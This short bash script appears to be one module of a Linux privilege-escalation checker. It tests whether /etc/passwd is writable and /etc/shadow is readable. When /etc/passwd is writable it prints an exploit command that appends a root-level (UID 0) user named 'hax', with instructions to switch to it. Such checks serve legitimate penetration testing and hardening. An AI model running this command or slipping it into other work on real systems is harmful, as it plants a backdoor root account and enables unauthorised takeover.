#!/bin/bash
source "$(dirname "$0")/00_common.sh"

info "Checking /etc/passwd writability..."

if [ -w /etc/passwd ]; then
    success "VULNERABLE: /etc/passwd is writable!"
    warn "Exploit: Add user with UID 0"
    echo 'echo "hax:\$1\$xyz\$hash:0:0::/root:/bin/bash" >> /etc/passwd'
    echo "Then: su hax"
else
    fail "/etc/passwd not writable"
fi

# Also check shadow
if [ -r /etc/shadow ]; then
    success "READABLE: /etc/shadow"
    warn "Can crack password hashes"
fi
